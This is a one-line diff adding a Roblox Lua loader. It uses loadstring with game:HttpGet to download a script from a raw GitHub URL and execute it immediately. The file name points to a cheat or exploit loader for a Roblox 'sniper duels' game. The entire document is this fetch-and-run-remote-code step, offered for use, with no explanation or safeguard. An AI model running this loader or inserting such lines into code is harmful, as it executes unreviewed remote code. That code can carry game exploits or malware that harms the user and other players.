@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/ranked-sniper-duels-spam7-ll7thy3edzumri.lua"))()
